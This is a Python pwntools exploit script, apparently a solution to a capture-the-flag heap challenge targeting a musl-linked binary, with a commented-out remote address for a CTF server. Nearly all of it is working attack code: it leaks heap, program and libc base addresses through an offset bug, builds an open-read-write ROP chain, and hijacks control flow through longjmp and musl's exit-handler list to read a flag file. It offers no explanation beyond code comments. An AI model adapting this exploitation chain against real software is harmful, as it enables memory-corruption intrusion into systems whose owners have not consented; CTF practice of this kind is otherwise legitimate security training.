from pwn import *
 
# context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('./pwn')
# io = remote('node4.buuoj.cn', 26888)
libc = ELF('/lib/x86_64-linux-musl/libc.so')
elf = ELF('./pwn')


def add(size, idx, content = '\n'):
    io.sendafter(':', '1')
    io.send(p32(size))
    io.send(p8(idx))
    io.send(content)


def change_size(size, idx):
    io.sendafter(':', '1')
    io.send(p32(size))
    io.send(p8(idx))
    io.recvuntil('no more magic')


def set_offset(idx):
    io.sendafter(':', '2')
    io.send(p8(idx))
    io.recvuntil('Tataru tripped your pet and you failed to order it!\n')


def read(idx, content):
    io.sendafter(':', '3')
    io.send(p8(idx))
    io.send(content)


def write(idx):
    io.sendafter(':', '4')
    io.send(p8(idx))
    io.recvuntil('Tataru tripped your pet, your pet failed to use ')
    return io.recvuntil(' to attack the boss\n', drop=True)


def pwn():
    for _ in range(5):
        add(0x40, 1)
    add(0x40, 0)
    change_size(0x1010, 0)
    read(0, b'a' * 0x2df)
    heap_base = u64(write(0).ljust(8, b'\x00')) - 0xb8
    log.success('heap_base: ' + hex(heap_base))
    add(0x30, 0)
    offset = 0x60 + 8
    for _ in range(0x2000):
        offset += 0x1000
        # log.success('cur offset: ' + hex(offset))
        change_size(offset, 0)
        set_offset(0)
        change_size(offset + 8, 0)
        read(0, p64(0))
        if len(io.recvuntil('failed', timeout=0.5)) == 0:
            break
    log.success('offset: ' + hex(offset))
    bss_base = (heap_base - offset) & 0xfffffffff000
    elf_base = bss_base - 0x4000
    log.success('bss_base: ' + hex(bss_base))
    log.success('elf_base: ' + hex(elf_base))
    read_got = elf_base + elf.got['read']
    context(os = 'linux', arch = 'amd64', log_level = 'debug')

    change_size((heap_base + 0x118) - (bss_base + 0xfa0), 0)
    set_offset(0)
    change_size((heap_base + 0x120) - (bss_base + 0xfa0), 0)
    read(0, p64(bss_base + 0x10))
    payload = p64(bss_base + 0x10) + p64(0x1000) + p64(0)               # note0
    payload += p64(read_got) + p64(8) + p64(0)                          # note1
    add(0x30, 0, payload)
    libc_base = u64(write(1).ljust(8, b'\x00')) - libc.sym['read']
    log.success('libc_base: ' + hex(libc_base))
    # mov rsp, [rdi+30h]; jmp qword ptr [rdi+38h];
    longjmp = libc_base + libc.sym['longjmp']
    open = libc_base + libc.sym['open']
    read_libc = libc_base + libc.sym['read']
    write_libc = libc_base + libc.sym['write']
    pop_rdi_ret = libc_base + 0x00000000000152a1
    pop_rsi_ret = libc_base + 0x000000000001dad9
    pop_rdx_ret = libc_base + 0x000000000002cdae
    ret = libc_base + 0x00000000000152a2
    head = libc_base + 0xb6d48
    slot = libc_base + 0xb6f64

    payload = p64(bss_base + 0x100 - 0x30) + p64(0x1000) + p64(0)       
    payload += p64(bss_base + 0x40) + p64(0x100) + p64(0)               
    read(0, payload)

    ropchain_addr = bss_base + 0x300
    filename_addr = bss_base + 0x400
    buf = bss_base + 0x500
    filename = b'./flag\x00'
    ropchain = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(read_libc)
    ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(write_libc)
    ropchain = ropchain.ljust(0x100, b'\x00')
    ropchain += filename
    payload  = p64(bss_base + 0x100 - 0x1f * 8)                         # head->next
    payload += p64(longjmp + 0x1e)                                      # head->next.f[0x1f]    rip
    payload  = payload.ljust(0x30, b'\x00')                              
    payload += p64(ropchain_addr) + p64(ret)                            # rsp, rip
    payload  = payload.ljust(0x108, b'\x00')
    payload += p64(bss_base + 0x100)                                    # head->next.a[0x1f]    rdi
    payload  = payload.ljust(0x200, b'\x00')
    payload += ropchain
    read(0, payload)
    
    payload = p64(bss_base + 0x200) + p64(0x1000) + p64(0)    
    payload += p64(bss_base) + p64(heap_base + 0x58 - bss_base) + p64(heap_base + 0x50 - bss_base - 0x30)               
    read(1, payload)
    read(1, p64(head - 0x48))
    add(0x100, 0, p64(0) * 5 + p64(bss_base + 0x100))
    # gdb.attach(io)
    io.sendafter(':', '5')
    # pause()
    io.recvuntil('You have defeated tataru, you have won!\n')
    flag = io.recv()
    log.success(flag.decode())


if __name__ == '__main__':
    pwn()

